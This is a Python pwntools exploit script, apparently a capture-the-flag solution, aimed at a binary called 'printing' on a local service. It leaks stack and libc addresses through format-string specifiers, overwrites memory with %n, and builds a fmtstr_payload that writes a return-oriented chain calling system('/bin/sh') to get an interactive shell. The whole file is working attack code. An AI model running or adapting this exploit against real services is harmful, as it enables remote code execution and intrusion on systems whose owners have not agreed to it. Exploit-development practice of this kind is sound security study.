from pwn import *

exe = ELF("./printing")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.arch = "amd64"

# p = process("./printing")
# gdb.attach(p)
p = remote("localhost", 5000)

p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"initials: ", b"%p")

p.recvline()
stack_leak = int(p.recvline().strip().split()[-1], 16)
log.success(f"{hex(stack_leak)=}")

p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"initials: ", b"%13$p")

p.recvline()
libc_leak = int(p.recvline().strip().split()[-1], 16)
libc.address  = libc_leak - 0x2a1ca
log.success(f"{hex(libc.address )=}")

p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"initials: ", b"%69x%8$n")

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"100")

ret_ptr = stack_leak + 0x1a8
pop_rdi = libc.address + 0x10f75b
ret = libc.address + 0x2882f
libc_system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))

writes = {
    ret_ptr: pop_rdi,
    ret_ptr+0x8: binsh,
    ret_ptr+0x10: ret,
    ret_ptr+0x18: libc_system
}

payload = fmtstr_payload(8, writes)
p.sendlineafter(b"like to print: ", payload)

p.interactive()
